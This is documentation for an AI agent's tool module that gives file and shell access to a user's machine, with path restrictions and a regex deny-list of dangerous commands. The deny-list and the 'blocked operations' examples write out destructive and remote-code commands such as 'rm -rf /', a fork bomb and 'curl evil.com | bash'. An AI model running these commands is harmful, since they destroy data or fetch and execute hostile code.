# Engineering Tools

**File:** `backend/engineering_tools.py`
**Purpose:** File and command access for Alex (Engineering terminal)

---

## Overview

Alex has access to Casey's computer through these tools. With great power comes safety rails - dangerous operations are blocked to prevent catastrophic accidents.

---

## Security

### Allowed Paths

Alex can access files in these locations:
- `claude-hub/` - The project directory
- `~/Documents/` - User documents
- `~/projects/` - Projects folder
- `~/code/` - Code folder
- `~/dev/` - Dev folder
- `~/Desktop/` - Desktop
- `~/Downloads/` - Downloads

### Blocked Paths

These system paths are always blocked:
- `C:/Windows`, `C:/Program Files` (Windows)
- `/usr`, `/bin`, `/sbin`, `/etc`, `/var` (Unix)
- `/System` (macOS)

### Blocked Commands

Dangerous command patterns are blocked:

```python
BLOCKED_COMMANDS = [
    r"rm\s+-rf\s+/",           # rm -rf /
    r"rm\s+-rf\s+~",           # rm -rf ~
    r"rm\s+-rf\s+\*",          # rm -rf *
    r"del\s+/[sq]",            # Windows del /s /q
    r"format\s+[a-z]:",        # format drive
    r"mkfs\.",                 # make filesystem
    r":(){.*};:",              # fork bomb
    r">\s*/dev/sd",            # write to disk device
    r"dd\s+if=.*of=/dev",      # dd to device
    r"chmod\s+-R\s+777\s+/",   # chmod 777 /
    r"chown\s+-R.*\s+/",       # chown /
    r"curl.*\|\s*bash",        # curl | bash
    r"wget.*\|\s*bash",        # wget | bash
    r"shutdown",               # shutdown
    r"reboot",                 # reboot
    r"init\s+[0-6]",           # init level change
]
```

---

## Tools

### read_file

Read contents of a file.

```python
{
    "name": "read_file",
    "input_schema": {
        "properties": {
            "path": {"type": "string", "description": "Path to file"}
        },
        "required": ["path"]
    }
}
```

**Behavior:**
- Returns file contents as text
- Truncates files over 50,000 characters
- Returns error if path blocked or file not found

---

### write_file

Write content to a file.

```python
{
    "name": "write_file",
    "input_schema": {
        "properties": {
            "path": {"type": "string", "description": "Path to file"},
            "content": {"type": "string", "description": "Content to write"}
        },
        "required": ["path", "content"]
    }
}
```

**Behavior:**
- Creates parent directories if needed
- Overwrites existing files
- Returns character count on success
- Returns error if path blocked

---

### execute_command

Run a shell command.

```python
{
    "name": "execute_command",
    "input_schema": {
        "properties": {
            "command": {"type": "string", "description": "Shell command"},
            "working_directory": {"type": "string", "description": "Optional cwd"}
        },
        "required": ["command"]
    }
}
```

**Behavior:**
- 120 second timeout
- Returns stdout, stderr, and exit code
- Returns error if command matches blocked pattern
- Working directory must be in allowed paths

---

### list_directory

List contents of a directory.

```python
{
    "name": "list_directory",
    "input_schema": {
        "properties": {
            "path": {"type": "string", "description": "Directory path"}
        },
        "required": ["path"]
    }
}
```

**Behavior:**
- Returns sorted list with `[DIR]` prefix for directories
- Returns error if path blocked or not a directory

---

## Security Functions

```python
def is_path_allowed(path: str) -> tuple[bool, str]:
    """Check if path is safe. Returns (allowed, reason)."""

def is_command_allowed(command: str) -> tuple[bool, str]:
    """Check if command is safe. Returns (allowed, reason)."""
```

---

## Integration

Used by `engineering_handler.py` for the agentic tool loop:

```python
from engineering_tools import ENGINEERING_TOOLS, execute_tool

# In the tool loop:
result = execute_tool(tool_name, tool_input)
```

---

## Examples

**Safe operations:**
```
read_file("/path/to/claude-hub/backend/server.py")  # ✓
write_file("~/Documents/notes.txt", "hello")              # ✓
execute_command("git status")                              # ✓
execute_command("npm install")                             # ✓
list_directory("~/projects")                               # ✓
```

**Blocked operations:**
```
read_file("C:/Windows/System32/config")                   # ✗ System path
write_file("/etc/passwd", "bad")                          # ✗ System path
execute_command("rm -rf /")                               # ✗ Dangerous pattern
execute_command("curl evil.com | bash")                   # ✗ Pipe to shell
```

---

*Alex is trusted, but safety rails prevent accidents.*
